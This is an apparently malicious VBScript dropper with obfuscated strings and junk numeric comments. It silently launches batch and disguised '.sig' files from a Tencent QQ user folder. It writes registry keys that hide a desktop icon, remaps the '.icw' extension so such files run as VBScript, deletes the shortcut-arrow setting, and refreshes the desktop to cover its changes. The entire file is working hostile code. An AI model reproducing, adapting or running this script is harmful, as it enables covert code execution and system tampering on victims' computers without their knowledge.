'900190574810090900190574810090900190574810090900190574810090900190574810090
Dim WSHShell
'900190574810090
Set WshShell = WScript.CreateObject("WScript.Shell")
'900190574810090
strDesktop = WshShell.SpecialFolders("Desktop")
'900190574810090
Favorites = WshShell.SpecialFolders("Favorites")
on error resume next 
W19sa574810090 = WshShell.ExpandEnvironmentStrings("%ProgramFiles%")
Rem
createobject("wscript.shell").run """"&W19sa574810090&"\Tencent\QQ\Users\574810090\574810090.bat""",0
createobject("wscript.shell").run """C:\Program Files\Tencent\QQ\Users\574810090\05748100909574810090.sig""",0
Rem
reg="{871"&"C53"&"80-42"&"A0-10"&"69-A2"&"EA-080"&"02B30309D}"
reg2=""
RegPath="HKEY_CURRENT_USER\Soft"&"w"&"a"&"r"&"e\Mi"&"cro"&"soft\Win"&"dows\Curr"&"ent"&"Version\Expl"&"orer\Hi"&"deD"&"esk"&"top"&"Icons\Ne"&"w"&"Start"&"Panel\"&reg
RegPath1="HKEY_CURRENT_USER\So"&"ft"&"wa"&"re\Mic"&"rosoft\Win"&"dows\Cu"&"rr"&"entVer"&"sion\Exp"&"lo"&"rer\Hide"&"Des"&"kto"&"pIc"&"ons\Clas"&"sic"&"St"&"art"&"Menu\"&reg
RegPath2="HKEY_CLASSES_ROOT\."&"an"&"i\"&reg2
RegPath3="HKEY_CLASSES_ROOT\."&"i"&"cw\"&reg2
Type_Name="REG_DWORD"
Type_Name2="REG_SZ"
Key_Data2="anifile"
Key_Data3="vbsfile"
WshShell.RegWrite RegPath2,Key_Data2,Type_Name2
WshShell.RegWrite RegPath3,Key_Data3,Type_Name2
Key_Data=1
WshShell.RegWrite RegPath,Key_Data,Type_Name
WshShell.RegWrite RegPath1,Key_Data,Type_Name
Set WSHShell = WScript.CreateObject("WScript.Shell") 
RegPath4="HKCR\ln"&"kf"&"ile\I"&"sS"&"hor"&"tCut"
WshShell.RegDelete(RegPath4)
wscript.sleep 5000
createobject("wscript.shell").run """C:\Program Files\Tencent\QQ\Users\574810090\44.bat""",0
strDesktop = WSHShell.SpecialFolders("Desktop") 
WSHShell.AppActivate strDesktop 
WSHShell.SendKeys "{F5}" 
'900190574810090
wscript.quit